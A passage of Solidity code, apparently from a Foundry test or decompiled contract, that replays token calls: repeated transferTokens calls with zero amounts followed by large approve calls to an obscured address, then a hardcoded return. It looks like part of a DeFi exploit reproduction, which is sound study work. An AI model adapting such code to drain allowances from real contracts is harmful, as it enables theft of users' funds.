            I(xc02a).approve(x7d27, 13011700000000000000000);
            I(x576c).transferTokens(x2260, r, 0);
            I(xd282).transferTokens(x2260, r, 0);
            // uint256 v83 = 0;
            uint256 v83 = I(x2260).allowance(r, x7d27);
            console2.log("I(x2260).allowance(r, x7d27)\t->", uint256(0));
            I(x2260).approve(x7d27, 140126000000);
            I(x576c).transferTokens(xa0b8, r, 0);
            I(xd282).transferTokens(xa0b8, r, 0);
            // uint256 v84 = 0;
            uint256 v84 = I(xa0b8).allowance(r, x7d27);
            console2.log("I(xa0b8).allowance(r, x7d27)\t->", uint256(0));
            I(xa0b8).approve(x7d27, 30027000000000);
            I(x576c).transferTokens(x6b17, r, 0);
            I(xd282).transferTokens(x6b17, r, 0);
            // uint256 v85 = 0;
            uint256 v85 = I(x6b17).allowance(r, x7d27);
            console2.log("I(x6b17).allowance(r, x7d27)\t->", uint256(0));
            I(x6b17).approve(x7d27, 3002700000000000000000000);
            I(x576c).transferTokens(x1f98, r, 0);
            I(xd282).transferTokens(x1f98, r, 0);
            // uint256 v86 = 0;
            uint256 v86 = I(x1f98).allowance(r, x7d27);
            console2.log("I(x1f98).allowance(r, x7d27)\t->", uint256(0));
            I(x1f98).approve(x7d27, 200180000000000000000000);
        }

        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}
